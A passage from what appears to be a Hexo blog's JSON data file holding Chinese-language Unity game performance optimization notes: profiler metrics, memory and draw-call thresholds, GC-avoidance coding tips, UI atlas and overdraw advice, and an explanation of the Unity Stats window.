包,Mono,Lua</td>\n<td>内存峰值,堆内存</td>\n<td>内存泄露</td>\n</tr>\n<tr>\n<td>粒子系统</td>\n<td>使用指标</td>\n<td>总体数量,active 数量</td>\n<td>Overdraw</td>\n</tr>\n<tr>\n<td>粒子系统的 API</td>\n<td>ParticleSystem.Update,ParticleSystem.SubmitVBO,ParticleSystem.Draw</td>\n<td>ParticleSystem.ScheduleGeometryJobs</td>\n<td></td>\n</tr>\n<tr>\n<td>动画系统</td>\n<td></td>\n<td>数量,AC 制作,CPU</td>\n<td></td>\n</tr>\n<tr>\n<td>动画系统的 API</td>\n<td>Animators.Update,Animation.Update</td>\n<td>MeshSkinning.Update</td>\n<td>Animator.Initialize</td>\n</tr>\n</tbody></table>\n<h1 id=\"官方数值建议\"><a href=\"#官方数值建议\" class=\"headerlink\" title=\"官方数值建议\"></a>官方数值建议</h1><table>\n<thead>\n<tr>\n<th>数值名称</th>\n<th>官方建议数值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ReservedMono峰值(MB)</td>\n<td>小于 80MB</td>\n</tr>\n<tr>\n<td>DrawCall峰值(次)</td>\n<td>小于 250 次</td>\n</tr>\n<tr>\n<td>平均帧率</td>\n<td>大于 25</td>\n</tr>\n<tr>\n<td>纹理资源峰值(MB)</td>\n<td>小于 50MB</td>\n</tr>\n<tr>\n<td>网格资源峰值(MB)</td>\n<td>小于 20MB</td>\n</tr>\n<tr>\n<td>动画资源峰值(MB)</td>\n<td>小于 15MB</td>\n</tr>\n<tr>\n<td>音频资源峰值(MB)</td>\n<td>小于 15MB</td>\n</tr>\n<tr>\n<td>Tris 峰值(面)</td>\n<td>小于 200000(20W 面)</td>\n</tr>\n</tbody></table>\n<h1 id=\"CPU-优化\"><a href=\"#CPU-优化\" class=\"headerlink\" title=\"CPU 优化\"></a>CPU 优化</h1><ul>\n<li>1:简单代码控制,避免CPU资源浪费</li>\n<li>2:避免使用闭包</li>\n<li>3:MonoBehaviour优化</li>\n<li>4:Component的优化</li>\n<li>5:GameObject的优化</li>\n</ul>\n<h1 id=\"GPU-优化\"><a href=\"#GPU-优化\" class=\"headerlink\" title=\"GPU 优化\"></a>GPU 优化</h1><h1 id=\"内存优化\"><a href=\"#内存优化\" class=\"headerlink\" title=\"内存优化\"></a>内存优化</h1><h1 id=\"UI-优化\"><a href=\"#UI-优化\" class=\"headerlink\" title=\"UI 优化\"></a>UI 优化</h1><ul>\n<li>1:NGUI 的优化</li>\n<li>2:UGUI 的优化</li>\n</ul>\n<h1 id=\"资源优化\"><a href=\"#资源优化\" class=\"headerlink\" title=\"资源优化\"></a>资源优化</h1><ul>\n<li>AssetBundle</li>\n<li>打包</li>\n</ul>\n<h1 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h1><ul>\n<li>shader</li>\n</ul>\n<h1 id=\"扩展阅读\"><a href=\"#扩展阅读\" class=\"headerlink\" title=\"扩展阅读\"></a>扩展阅读</h1><ul>\n<li>1:<a href=\"http://gad.qq.com/article/detail/28682\" target=\"_blank\" rel=\"noopener\">守望先锋:ECS架构</a>,<a href=\"https://docs.unity3d.com/Packages/com.unity.entities@0.1/manual/index.html\" target=\"_blank\" rel=\"noopener\">Unity官方文档</a>,<a href=\"http://blog.codingnow.com/2017/06/overwatch_ecs.html\" target=\"_blank\" rel=\"noopener\">云风</a>,<a href=\"http://t-machine.org/index.php/2007/09/03/entity-systems-are-the-future-of-mmog-development-part-1/\" target=\"_blank\" rel=\"noopener\">ECS博客</a>,<a href=\"https://www.youtube.com/watch?v=lNTaC-JWmdI\" target=\"_blank\" rel=\"noopener\">国外谈论</a>,<a href=\"https://github.com/sschmid/Entitas-CSharp\" target=\"_blank\" rel=\"noopener\">Entitas-CSharp</a>),<a href=\"https://github.com/egametang/ET\" target=\"_blank\" rel=\"noopener\">ET框架</a></li>\n<li>2:推荐想学习优化的同学一本书,&lt;&lt;Unity 游戏优化 2&gt;&gt;,作者是:克里斯*迪金森,翻译:蔡俊鸿,雷鸿飞.</li>\n</ul>\n<h1 id=\"代码控制\"><a href=\"#代码控制\" class=\"headerlink\" title=\"代码控制\"></a>代码控制</h1><ul>\n<li><p>1: 尽量不用foreach,全使用for,因为foreach产生GC</p>\n</li>\n<li><p>2: 字典替换成下面的写法</p>\n<pre><code>  var enumerator = m_Dictionary.GetEnumerator();\n  while (enumerator.MoveNext())\n  {\n      var element = enumerator.Current;\n      element.Value.UpdateComponent(deltaTime);\n  }</code></pre></li>\n<li><p>3: 字符串 + 号拼接不超过约10次,不会产生GC,如果超过10次,要使用StringBuilder进行拼接,不会产生GC</p>\n</li>\n<li><p>4: Struct 与 Class  如何装箱或拆箱少，堆内存少,Struct 在栈中不产生 GC，class 在堆中，会产生 GC。对 Struct 的结点修改时，修改完以后记得重新赋值。因为 Struct 赋值是 copy<br>而不是引用，修改完以后，以前的不生效。</p>\n</li>\n<li><p>5: 堆栈的空间有限，对于大量的逻辑的对象，创建类要比创建结构好一些。<br>结构表示轻量对象，并且结构的成本较低，适合处理大量短暂的对象。<br>在表现抽象和多级别的对象层次时，类是最好的选择。<br>大多数情况下该类型只是一些数据时，结构是最佳的选择。</p>\n</li>\n<li><p>6: 数组，ArrayList，List 的区别;</p>\n</li>\n</ul>\n<blockquote>\n<p>数组：内存中是连续存储的，索引速度非常快，赋值与修改元素也很简单。但不<br>利于动态扩展以及移动。<br>ArrayList: 因为数组的缺点，就产生了 ArrayList。ArrayList：使用该类时必须进行引用，同时继承了 IList 接口，提供了数据存储和检索，ArrayList 对象的大小动态伸缩，支持不同类型的结点。<br>ArrayList 虽然很完美，但结点类型是 Object，故不是类型安全的，也可能发生<br>装箱和拆箱操作，带来很大的性能耗损。对象是值类型的话会带来装箱拆箱操作<br>List 是泛型接口，规避了 ArrayList 的两个问题。利于动态扩展以及移动,但是搜索速度慢</p>\n</blockquote>\n<ul>\n<li>7: 不要把枚举当 TKey (字典的key)使用，不要把枚举转成 string 使用。</li>\n</ul>\n<h1 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h1><ul>\n<li>1:变量的作用域,成员变量作用于类、局部变量作用于函数、次局部变量作用于函数局部<br>片段。生命周期：变量随着其寄存对象生而生和消亡（不包括非实例化的 static 和 const<br>对象）。</li>\n<li>2:委托概念：是一个类型安全的对象，它指向程序中另一个以后会被调用的方法（或<br>多个方法）。通俗的说，委托是一个可以引用方法的对象，当创建一个委托，也<br>就创建一个引用方法的对象，进而就可以调用那个方法，即委托可以调用它所指<br>的方法。如何没有涉及到闭包的话，委托代码只生产一个函数而不是一个类。lamda表达式(闭包)</li>\n<li>3:    闭包概念：函数和与其相关的引用环境组合而成的实体。本质 1：代码块依然维护着它第一个被创建时环境（执行上下文）- 即它仍可以使用创建它的方法中局部变量，即使那个方法已经执行完了。(循环引用不释放);本质 2 Closures close over variables, not over values。闭包关闭的是变量，而不是值.闭包引用了外部变量就会生成一个新得类.函数调用频繁不使用闭包</li>\n</ul>\n<h1 id=\"MonoBehaviour-优化\"><a href=\"#MonoBehaviour-优化\" class=\"headerlink\" title=\"MonoBehaviour 优化\"></a>MonoBehaviour 优化</h1><ul>\n<li><p>1:如果没有相应的事件处理，删除对应的空函数</p>\n</li>\n<li><p>2:Update 优化 在 update 中尽量不要调用查找对象或组件方法如 FindByTag 或 Find 等等。可<br>以在 start 中先缓存下来，然后使用。 如果没必要每帧的逻辑，可以降低频率，方法如下：</p>\n<pre><code>  Void Update（）{if（Time.frameCount%6==0）{DoSomething();}}</code></pre></li>\n<li><p>3:如果没必要每帧的逻辑，可以使用周期性的协程,如果没必要每帧的逻辑，可以使用InvokeRepeating(“DoSomeThing”,0.5f,1.0f);</p>\n</li>\n<li><p>4:Gameobject 不可见时，设置 enabled = false 时，update 就会停止调用。</p>\n</li>\n<li><p>5:协程有优化:yield return null;每帧产生9个字节的GC垃圾,其余函数也会产生GC垃圾,需要使提前预生成方式</p>\n<pre><code>  WaitForSeconds wfs = new WaitForSeconds(0.1f);\n  IEnumerator AtlasTextureSetting()\n  {\n      yield return wfs;\n  }</code></pre></li>\n</ul>\n<h1 id=\"Component-优化\"><a href=\"#Component-优化\" class=\"headerlink\" title=\"Component 优化\"></a>Component 优化</h1><ul>\n<li>1:使用内建的数组，比如用 Vector3.zero 而不是 new Vector(0, 0, 0);</li>\n<li>2:transform.localRotation = Quaternion.Euler(Vector3.zero);transform.localScale =Vector3.one;transform.localPosition =Vector3.one;等</li>\n</ul>\n<h1 id=\"GameObject-相关优化\"><a href=\"#GameObject-相关优化\" class=\"headerlink\" title=\"GameObject 相关优化\"></a>GameObject 相关优化</h1><ul>\n<li>1:（脚本和本地引擎 C++代码之间的通信开销）Gameobject 缓存：类似组件的缓存策略。查找对象标签：if (go.CompareTag (“xxx”)来代替 if (go.tag == “xxx”)，因为内部循环调用对象分配的标签属性以及拷贝额外内存。SendMessageUpwards、SendMessage：少用这两个函数，使用委托替代。缓存组件：调用 GetComponent 函数耗性能，用变量先缓存到内存在使用, 有必要时记得更新缓存组件。</li>\n</ul>\n<h1 id=\"NGUI-相关优化\"><a href=\"#NGUI-相关优化\" class=\"headerlink\" title=\"NGUI 相关优化\"></a>NGUI 相关优化</h1><ul>\n<li>1: Canvas.BuildBatch()，<br>合批 Canvas 下所有网格，这个性能热点在 5.2 版本后挪到了子线程去做减轻了<br>主线程的压力，而 NGUI 作为一个插件没法做到这一点，网格合批的性能热点还<br>是耗在主线程的 UIPanel.LateUpdate()；</li>\n<li>2 : UGUI 的 UIMesh 生成是通过底层 C++代码实<br>现的，而 NGUI 只能通过上层的不断创建 Vertex List，这样在堆内存的管理上，<br>UGUI 确实要好很多，带来的隐形收益就是 GC 触发次数会少很多。</li>\n</ul>\n<h1 id=\"UI-资源规范（内存优化）\"><a href=\"#UI-资源规范（内存优化）\" class=\"headerlink\" title=\"UI 资源规范（内存优化）\"></a>UI 资源规范（内存优化）</h1><ul>\n<li>1:任何的 UI 图集最大 size 1024*1024（内存优化）；</li>\n<li>2:同一个界面出现的 UI 资源尽量放到一个图集，重复利用的公用资源放<br>common（DrawCall 优化）；</li>\n<li>3:能用九宫格的尽量用九宫格来减小原图大小（内存优化）；</li>\n<li>4.美术给过来的 UI 原图 size 尽量小，对于一些全屏的 loading 原画图，原画大<br>小是 1280 * 720，让美术按照比例高度缩小到 500，<br>这样一张 1024<em>1024 的图集就可以放两张原图了，提升图集利用率。对于一些<br>600</em>400 类似大小的原图，就尽量按比例把最长边压小到 500，这样出来的图<br>集就是 512 * 512 而不是 1024 * 1024（内存优化）；</li>\n<li>5.对于特别长条的 UI 原图，例如 1000<em>100，如果由于加入这个长条的原图导<br>致图集大小变大而且利用率很低的话，要把 1000</em>100 的原图拆分成两张图<br>500*100，在制作界面的时候用两个 Image 拼接即可，这样可以把 1024 的图<br>集缩小到 512（内存优化）；</li>\n<li>6.图集利用率低于 1/3 的时候，要考虑和其他同一个 size 的图集合并以提升利<br>用率。合并的原则是不改变任何一个图集的大小，这样即可完全省掉一张图集（内<br>存优化、安装包量优化）；</li>\n<li>7.尽量复用 UI 资源，减少不必要的原图，例如一个卡牌分了五种品质原画底图，<br>白蓝黄绿紫，就不要使用五张大底图了，让美术同事画一个灰色原图，Image 在<br>使用的时候直接按需求修改顶点色即可（内存优化）；</li>\n<li>8.关闭 mipmaps（内存优化）。</li>\n</ul>\n<h1 id=\"GPU-优化-1\"><a href=\"#GPU-优化-1\" class=\"headerlink\" title=\"GPU 优化\"></a>GPU 优化</h1><h4 id=\"Shader优化\"><a href=\"#Shader优化\" class=\"headerlink\" title=\"Shader优化\"></a>Shader优化</h4><ul>\n<li>1:Fog { Mode Off }，最早有一个版本我们没有关闭 Fog</li>\n<li>2:Fragment 剔除掉 Alpha 为 0 的像素点，减少 OverDraw；</li>\n<li>3:OverDraw 优化,在每帧绘制中，如果一个像素被反复绘制的次数越多，那么它占用的资源也必然<br>更多。目前在移动设备上，OverDraw 的压力主要来自半透明物体。因为多数情<br>况下，半透明物体需要开启 Alpha Blend 且关闭 ZWrite，同时如果我们绘制<br>像 alpha=0 这种实际上不会产生效果的颜色上去，也同样有 Blend 操作，这是<br>一种极大的浪费。我们的 UI 绘制是 Alpha Blend 且关闭 ZWrite，因此 UI OverDraw 的优化主要<br>是在制作界面的时候减少 UI 重叠层级（和策划、美术 pk）。除此之外还是有一<br>些我们程序可以控制的优化点：1.对于九宫格的 Image，如果去掉 fillcenter 不影响最后出来的效果就要把<br>fillcenter 去掉，可以减少中间一片的像素绘制；2.看不见的元素且没有逻辑功能要 disable 或者挪出裁剪区域，而不要通过设置Alpha=0 来隐藏；3.不要使用一张 Alpha=0 的 Image 来实现放大响应区域的功能；4.UI 底层系统来控制隐藏看不见的元素，例如打开全屏 UI 的时候把下面看不见的 UI 挪出裁减区域、关闭主相机渲染。</li>\n</ul>\n<h4 id=\"CPU优化\"><a href=\"#CPU优化\" class=\"headerlink\" title=\"CPU优化\"></a>CPU优化</h4><ul>\n<li>1:优化DrawCall、Canvas.SendWillRenderCanvases()、Canvas.BuildBatch()</li>\n<li>2:DrawCall,DrawCall 是 CPU 调用底层图形接口，频繁的调用对 CPU 性能的影响是很明显<br>的。优化思路很简单，合批绘制。UGUI 本身的动态合批机制会帮我们尽量的去<br>优化合批，我们要做的就是弄清楚它的合批机制然后让 UI 元素尽量合批绘制。合理分配图集，同一个界面上的图尽量打到一个图集，多个界面复用的图，放到 common；</li>\n<li>3:制作界面的时候，相邻节点尽量使用同一个图集的图片；</li>\n<li>4:Text 本身也是用的 Font Texture，不同字体的 Text 也是来自不同的图集，所<br>以在布局界面的时候也要尽量避免穿插打断绘制流程；</li>\n<li>5:DrawCall 的数量不是完全由 Hierarchy 的布局决定，和 UI 的位置也有关系，<br>这个位置不是指的 Rectranform 上面的 size 位置重叠就一定打断绘制，而是真<br>实的三角面的位置是否重叠。这个可以在 Scene 视图下用线框模式(Texture<br>Wire)去观察；</li>\n<li>6:.少用 Mask 组件，Mask 实现的原理是 Stencil Buffer，往模版缓存里绘制，<br>模版缓存里的东西才是可见的。模板缓存会打断所有的合批，Mask 的子节点和<br>外面的节点无法合批，模板缓存自己占一个 DrawCall。Unity5.2 之后的版本建<br>议使用 2D Rect Mask 替代。</li>\n</ul>\n<h1 id=\"Profiler介绍及优化\"><a href=\"#Profiler介绍及优化\" class=\"headerlink\" title=\"Profiler介绍及优化\"></a>Profiler介绍及优化</h1><ul>\n<li>1: WaitForTargetFPS: Vsync(垂直同步)功能，即显示当前帧的CPU等待时间</li>\n<li>2: Camera.Render: 相机渲染准备工作的CPU占用量 </li>\n<li>3: Shader.Parse: 资源加入后引擎对Shader的解析过程</li>\n<li>4: Reserved Total:系统在当前帧的申请内存</li>\n<li>5: GameObjects in Scene:当前帧场景中的GameObject数量</li>\n<li>6: Total Objects in Scene:当前帧场景中的Object数量(除GameObject外，还有Component等). </li>\n<li>7: Total Object Count: Object数据 + Asset数量. </li>\n<li>8: Assets: Texture2d:记录当前帧内存中所使用的纹理资源情况，包括各种GameObject的纹理、天空盒纹理以及场景中所用的Lightmap资源.</li>\n<li>9: Scene Memory:记录当前场景中各个方面的内存占用情况，包括GameObject、所用资源、各种组件以及GameManager等（天般情况通过AssetBundle加载的不会显示在这里). </li>\n<li>10: Other:ManagedHeap.UseSize:代码在运行时造成的堆内存分配，表示上次GC到目前为止所分配的堆内存量. SerializedFile(3): WebStream:这个是由WWW来进行加载的内存占用. System.ExecutableAndDlls:不同平台和不同硬件得到的值会不一样。 </li>\n</ul>\n<p>#####<a href=\"https://blog.csdn.net/yangyy753/article/details/47025205\" target=\"_blank\" rel=\"noopener\">优化重点</a></p>\n<blockquote>\n<p>A:CPU-GC Allow:1.检测任何一次性内存分配大于2KB的选项 2.检测每帧都具有20B以上内存分配的选项.<br>B:Time ms:记录游戏运行时每帧CPU占用（特别注意占用5ms以上的）.<br>C:Memory Profiler-Other:1.ManagedHeap.UsedSize: 移动游戏建议不要超过20MB. 2.SerializedFile: 通过异步加载(LoadFromCache、WWW等)的时候留下的序列化文件,可监视是否被卸载.  3.WebStream: 通过异步WWW下载的资源文件在内存中的解压版本,比SerializedFile大几倍或几十倍,重点监视.<br>D: Memory Profiler-Assets: 1.Texture2D: 重点检查是否有重复资源和超大Memory是否需要压缩等. 2.AnimationClip: 重点检查是否有重复资源.  3.Mesh： 重点检查是否有重复资源.<br>E:Device.Present: 1.GPU的presentdevice确实非常耗时，一般出现在使用了非常复杂的shader.<br>2.GPU运行的非常快，而由于Vsync的原因，使得它需要等待较长的时间.<br>3.同样是Vsync的原因，但其他线程非常耗时，所以导致该等待时间很长，比如：过量AssetBundle加载时容易出现该问题.4.Shader.CreateGPUProgram:Shader在runtime阶段（非预加载）会出现卡顿(华为K3V2芯片).<br>F:StackTraceUtility.PostprocessStacktrace()和StackTraceUtility.ExtractStackTrace():  1.一般是由Debug.Log或类似API造成. 2.游戏发布后需将Debug API进行屏蔽.<br>G:GC.Collect: 原因: 1.代码分配内存过量(恶性的) 2.一定时间间隔由系统调用(良性的). 占用时间：1.与现有Garbage size相关 2.与剩余内存使用颗粒相关（比如场景物件过多，利用率低的情况下，GC释放后需要做内存重排)<br>H:GarbageCollectAssetsProfile:1.引擎在执行UnloadUnusedAssets操作(该操作是比较耗时的,建议在切场景的时候进行). 2.尽可能地避免使用Unity内建GUI，避免GUI.Repaint过渡GC Allow. 3.if(other.tag == GearParent.MogoPlayerTag)改为other.CompareTag(GearParent.MogoPlayerTag).因为other.tag为产生180B的GC Allow.<br>I:少用foreach，因为每次foreach为产生一个enumerator(约16B的内存分配)，尽量改为for. Lambda表达式，使用不当会产生内存泄漏. 尽量少用LINQ:1.部分功能无法在某些平台使用. 2.会分配大量GC Allow.<br>J:控制StartCoroutine的次数：  1.开启一个Coroutine(协程)，至少分配37B的内存. 2.Coroutine类的实例 – 21B.  3.Enumerator – 16B.缓存组件: 1.每次GetComponent均会分配一定的GC Allow. 2.每次Object.name都会分配39B的堆内存.<br>K:1:许多贴图采用的Format格式是ARGB 32 bit所以保真度很高但占用的内存也很大。在不失真的前提下，适当压缩贴图，使用ARGB 16 bit就会减少一倍，如果继续Android采用RGBA Compressed ETC2 8 bits（iOS采用RGBA Compressed PVRTC 4 bits），又可以再减少一倍。把不需要透贴但有alpha通道的贴图，全都转换格式Android：RGB Compressed ETC 4 bits，iOS：RGB Compressed PVRTC 4 bits。2:当加载一个新的Prefab或贴图，不及时回收，它就会永驻在内存中，就算切换场景也不会销毁。应该确定物体不再使用或长时间不使用就先把物体制空(null)，然后调用Resources.UnloadUnusedAssets()，才能真正释放内存。3:有大量空白的图集贴图，可以用TexturePacker等工具进行优化或考虑合并到其他图集中。4:要保证每张图得像素宽高都是4得倍数,即除4余0.<br>L:AudioClip:播放时长较长的音乐文件需要进行压缩成.mp3或.ogg格式，时长较短的音效文件可以使用.wav 或.aiff格式。</p>\n</blockquote>\n"},{"title":"Unity工具使用","date":"2020-05-08T03:41:32.000Z","top":3,"_content":"\n# UPR\n\n","source":"_posts/Unity/Optimize/Unity工具UPR.md","raw":"---\ntitle: Unity工具使用\ndate: 2020-05-08 11:41:32\ntop: 3\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n# UPR\n\n","slug":"Unity/Optimize/Unity工具UPR","published":1,"updated":"2020-06-15T07:10:29.259Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d07003c2gk72ehs2lvs","content":"<h1 id=\"UPR\"><a href=\"#UPR\" class=\"headerlink\" title=\"UPR\"></a>UPR</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"UPR\"><a href=\"#UPR\" class=\"headerlink\" title=\"UPR\"></a>UPR</h1>"},{"title":"Unity工具使用","date":"2020-05-08T03:41:32.000Z","top":2,"_content":"\n# ARM Mobile Studio\n\n# XCode\n\n# AndroidStudio\n\n# RenderDoc\n\n# UWA\n\n# UPR\n\n# Profile\n\n# Frame Debug\n\n# Physics Debug\n\n# 渲染统计窗口\n游戏视野（Game View）右上角有一个Stats按钮。这个按钮是按下状态时，会显示一个半透明窗口，它显示对于优化性能很有用的实时渲染统计数据。根据目标平台不同，精确的统计数据也不同。\n\n\n* Time per frame and FPS:每帧时间和FPS.处理和渲染一帧消耗的时间（它决定FPS）。注意这个时间仅包含每帧的逻辑更新和游戏视图渲染，不包含编辑器绘制屏幕适度、检视器和其它编辑器中才有的处理。          \n详情:表示引擎处理和渲染一个游戏帧所花费的时间,该数字主要受到场景中渲染物体数量和 GPU性能的影响，FPS数值越高，游戏场景的动画显示会更加平滑和流畅。一般来说，超过30FPS的画面人眼不会感觉到卡，由于视觉残留的特性，光在视网膜上停止总用后人眼还会保持1/24秒左右的时间，因此游戏画面每秒帧数至少要保证在30以上。另外，Unity中的FPS数值仅包括此游戏Scene里更新和渲染的帧，编辑器中绘制的Scene和其它监视窗口的进程不包括在内。\n\n\n* CPU:获取到当前占用CPU进行计算的时间绝对值，或时间点，如果Unity主进程处于挂断或休眠状态时，CPU time将会保持不变。\n\n* Render thread:GPU渲染线程处理图像所花费的时间，具体数值由GPU性能来决定.\n\n* Batches:绘制调用,“批处理”的引擎试图将多个渲染对象合并到一个内存块中, 以减少CPU开销。即Batched Draw Calls,是Unity内置的Draw Call Batching技术。        \n首先解释下什么叫做“Draw call”，CPU每次通知GPU发出一个glDrawElements（OpenGl中的图元渲染函数)或者 DrawIndexedPrimitive（DirectX中的顶点绘制方法）的过程称为一次Draw call,一般来说，引擎每对一个物体进行一次DrawCall，就会产生一个Batch,这个Batch里包含着该物体所有的网格和顶点数据，当渲染另一个相同的物体时，引擎会直接调用Batch里的信息，将相关顶点数据直接送到GPU,从而让渲染过程更加高效，即Batching技术是将所有材质相近的物体进行合并渲染。主要为 GPU调用数据 节省资源与时间.      \n对于含有多个不同Shader和Material的物体，渲染的过程比较耗时，因为会产生多个Batches。每次对物体的材质或者贴图进行修改，都会影响Batches里数据集的构成。因此，如果场景中有大量材质不同的物体，会很明显的影响到GPU的渲染效率。这里说几点关于Batches优化相关的方案:\n> 虽然Unity引擎自带Draw Call Batching技术，我们也可以通过手动的方式合并材质接近的物体；      \n> 尽量不要修改Batches里物体的Scale，因为这样会生成新的Batch。    \n> 为了提升GPU的渲染效率，应当尽可能的在一个物体上使用较少的材质，减少Batches过多的开销； \n> 对于场景中不会运动的物体，考虑设置Static属性,Static声明的物体会自动进行内部批处理优化。    \n\n* Verts：摄像机视野(field of view)内渲染的顶点总数。  \n\n* Tris:   摄像机视野(field of view)内渲染的的三角面总数量。      \n\n> 1. Camera的渲染性能受到Draw calls的影响。之前说过，对一个物体进行渲染，会生成相应的Draw call，处理一个Draw Call的时间是由它上边的Tris和Verts数目决定。尽可能得合并物体，会很大程度的提高性能。举个很简单例子，比如场景一种有1000个不同的物体，每个物体都有10个Tris；场景二中有10个不同的物体，每个物体有1000个Tris。在渲染处理中，场景一中会产生1000个Draw Calls，它的渲染时间明显比场景二慢。     \n> 2. Unity stats 视图中的 Tris 和 Verts 并不仅仅是视锥中的梯形内的 Tris 和 Verts，而是Camera中 field of view所有取值下的tris和verts，换句话说，哪怕你在当前game视图中看不到这个 cube，如果当你把 field of view调大到 179 过程中都看不到这个cube，stats面板才不会统计，GPU才不会渲染，否则都会渲染，而且unity不会把模型拆分，这个模型哪怕只有1个顶点需要渲染，unity也会把整个模型都渲出来。（参考自Mess的《Unity Camera组件部分参数详解》）\n\n\n\n* Screen:获当前Game屏幕的分辨率大小，后边的2.1MB表示总的内存使用数值。\n\n* SetPass calls:之前有讲到Batches,比如说场景中有100个gameobject,它们拥有完全一样的Material,那么这100个物体很可能会被Unity里的Batching机制结合成一个Batch。所以用“Batches”来描述Unity的渲染性能是不太合适的，它只能反映出场景中需要批处理物体的数量。那么可否用“Draw calls”来描述呢？答案同样是不适合。每一个“Draw calls”是CPU发送个GPU的一个渲染请求，请求中包括渲染对象所有的顶点参数、三角面、索引值、图元个数等，这个请求并不会占用过多的消耗，真正消耗渲染资源的是在GPU得到请求指令后，把指令发送给对应物体的Shader,让Shader读取指令并通知相应的渲染通道（Pass）进行渲染操作。      \n场景上有1个GameObject，希望能显示很酷炫的效果，它的Material上带有许多特定的Shader。为了实现相应的效果，Shader里或许会包含很多的Pass,每当GPU即将去运行一个Pass之前，就会产生一个“SetPass call”，因此在描述渲染性能开销上，“SetPass calls”更加有说服力。    \n* Shadow casters：表示场景中有多少个可以投射阴影的物体，一般这些物体都作为场景中的光源。\n* visible skinned  meshed：渲染皮肤网格的数量。\n* Animations:正在播放动画的数量。\n\n```\n参考\nhttps://docs.unity3d.com/Manual/OptimizingGraphicsPerformance.html        \nhttps://docs.unity3d.com/Manual/ProfilerRendering.html      \nhttps://docs.unity3d.com/Manual/RenderingStatistics.html\n```","source":"_posts/Unity/Optimize/Unity工具.md","raw":"---\ntitle: Unity工具使用\ndate: 2020-05-08 11:41:32\ntop: 2\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n# ARM Mobile Studio\n\n# XCode\n\n# AndroidStudio\n\n# RenderDoc\n\n# UWA\n\n# UPR\n\n# Profile\n\n# Frame Debug\n\n# Physics Debug\n\n# 渲染统计窗口\n游戏视野（Game View）右上角有一个Stats按钮。这个按钮是按下状态时，会显示一个半透明窗口，它显示对于优化性能很有用的实时渲染统计数据。根据目标平台不同，精确的统计数据也不同。\n\n\n* Time per frame and FPS:每帧时间和FPS.处理和渲染一帧消耗的时间（它决定FPS）。注意这个时间仅包含每帧的逻辑更新和游戏视图渲染，不包含编辑器绘制屏幕适度、检视器和其它编辑器中才有的处理。          \n详情:表示引擎处理和渲染一个游戏帧所花费的时间,该数字主要受到场景中渲染物体数量和 GPU性能的影响，FPS数值越高，游戏场景的动画显示会更加平滑和流畅。一般来说，超过30FPS的画面人眼不会感觉到卡，由于视觉残留的特性，光在视网膜上停止总用后人眼还会保持1/24秒左右的时间，因此游戏画面每秒帧数至少要保证在30以上。另外，Unity中的FPS数值仅包括此游戏Scene里更新和渲染的帧，编辑器中绘制的Scene和其它监视窗口的进程不包括在内。\n\n\n* CPU:获取到当前占用CPU进行计算的时间绝对值，或时间点，如果Unity主进程处于挂断或休眠状态时，CPU time将会保持不变。\n\n* Render thread:GPU渲染线程处理图像所花费的时间，具体数值由GPU性能来决定.\n\n* Batches:绘制调用,“批处理”的引擎试图将多个渲染对象合并到一个内存块中, 以减少CPU开销。即Batched Draw Calls,是Unity内置的Draw Call Batching技术。        \n首先解释下什么叫做“Draw call”，CPU每次通知GPU发出一个glDrawElements（OpenGl中的图元渲染函数)或者 DrawIndexedPrimitive（DirectX中的顶点绘制方法）的过程称为一次Draw call,一般来说，引擎每对一个物体进行一次DrawCall，就会产生一个Batch,这个Batch里包含着该物体所有的网格和顶点数据，当渲染另一个相同的物体时，引擎会直接调用Batch里的信息，将相关顶点数据直接送到GPU,从而让渲染过程更加高效，即Batching技术是将所有材质相近的物体进行合并渲染。主要为 GPU调用数据 节省资源与时间.      \n对于含有多个不同Shader和Material的物体，渲染的过程比较耗时，因为会产生多个Batches。每次对物体的材质或者贴图进行修改，都会影响Batches里数据集的构成。因此，如果场景中有大量材质不同的物体，会很明显的影响到GPU的渲染效率。这里说几点关于Batches优化相关的方案:\n> 虽然Unity引擎自带Draw Call Batching技术，我们也可以通过手动的方式合并材质接近的物体；      \n> 尽量不要修改Batches里物体的Scale，因为这样会生成新的Batch。    \n> 为了提升GPU的渲染效率，应当尽可能的在一个物体上使用较少的材质，减少Batches过多的开销； \n> 对于场景中不会运动的物体，考虑设置Static属性,Static声明的物体会自动进行内部批处理优化。    \n\n* Verts：摄像机视野(field of view)内渲染的顶点总数。  \n\n* Tris:   摄像机视野(field of view)内渲染的的三角面总数量。      \n\n> 1. Camera的渲染性能受到Draw calls的影响。之前说过，对一个物体进行渲染，会生成相应的Draw call，处理一个Draw Call的时间是由它上边的Tris和Verts数目决定。尽可能得合并物体，会很大程度的提高性能。举个很简单例子，比如场景一种有1000个不同的物体，每个物体都有10个Tris；场景二中有10个不同的物体，每个物体有1000个Tris。在渲染处理中，场景一中会产生1000个Draw Calls，它的渲染时间明显比场景二慢。     \n> 2. Unity stats 视图中的 Tris 和 Verts 并不仅仅是视锥中的梯形内的 Tris 和 Verts，而是Camera中 field of view所有取值下的tris和verts，换句话说，哪怕你在当前game视图中看不到这个 cube，如果当你把 field of view调大到 179 过程中都看不到这个cube，stats面板才不会统计，GPU才不会渲染，否则都会渲染，而且unity不会把模型拆分，这个模型哪怕只有1个顶点需要渲染，unity也会把整个模型都渲出来。（参考自Mess的《Unity Camera组件部分参数详解》）\n\n\n\n* Screen:获当前Game屏幕的分辨率大小，后边的2.1MB表示总的内存使用数值。\n\n* SetPass calls:之前有讲到Batches,比如说场景中有100个gameobject,它们拥有完全一样的Material,那么这100个物体很可能会被Unity里的Batching机制结合成一个Batch。所以用“Batches”来描述Unity的渲染性能是不太合适的，它只能反映出场景中需要批处理物体的数量。那么可否用“Draw calls”来描述呢？答案同样是不适合。每一个“Draw calls”是CPU发送个GPU的一个渲染请求，请求中包括渲染对象所有的顶点参数、三角面、索引值、图元个数等，这个请求并不会占用过多的消耗，真正消耗渲染资源的是在GPU得到请求指令后，把指令发送给对应物体的Shader,让Shader读取指令并通知相应的渲染通道（Pass）进行渲染操作。      \n场景上有1个GameObject，希望能显示很酷炫的效果，它的Material上带有许多特定的Shader。为了实现相应的效果，Shader里或许会包含很多的Pass,每当GPU即将去运行一个Pass之前，就会产生一个“SetPass call”，因此在描述渲染性能开销上，“SetPass calls”更加有说服力。    \n* Shadow 